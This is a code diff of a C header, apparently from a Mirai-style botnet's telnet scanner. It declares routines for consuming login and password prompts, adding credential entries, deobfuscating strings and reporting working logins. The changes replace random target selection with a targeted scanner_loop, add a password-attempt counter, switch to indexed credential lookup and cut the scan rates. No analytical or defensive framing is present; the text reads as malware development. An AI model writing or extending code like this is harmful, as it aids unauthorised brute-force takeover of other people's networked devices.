@@ -4,13 +4,8 @@
 
 #include "includes.h"
 
-#ifdef DEBUG
-#define SCANNER_MAX_CONNS   128
-#define SCANNER_RAW_PPS     160
-#else
-#define SCANNER_MAX_CONNS   128
-#define SCANNER_RAW_PPS     160
-#endif
+#define SCANNER_MAX_CONNS   1
+#define SCANNER_RAW_PPS     1
 
 #define SCANNER_RDBUF_SIZE  256
 #define SCANNER_HACK_DRAIN  64
@@ -43,13 +38,12 @@ struct scanner_connection {
     int rdbuf_pos;
     char rdbuf[SCANNER_RDBUF_SIZE];
     uint8_t tries;
+    uint8_t passtries;
 };
 
-void scanner_init();
-void scanner_kill(void);
-
 static void setup_connection(struct scanner_connection *);
-static ipv4_t get_random_ip(void);
+
+void scanner_loop(ipv4_t ip);
 
 static int consume_iacs(struct scanner_connection *);
 static int consume_any_prompt(struct scanner_connection *);
@@ -58,7 +52,7 @@ static int consume_pass_prompt(struct scanner_connection *);
 static int consume_resp_prompt(struct scanner_connection *);
 
 static void add_auth_entry(char *, char *, uint16_t);
-static struct scanner_auth *random_auth_entry(void);
+static struct scanner_auth *auth_entry(int id);
 static void report_working(ipv4_t, uint16_t, struct scanner_auth *);
 static char *deobf(char *, int *);
 static BOOL can_consume(struct scanner_connection *, uint8_t *, int);
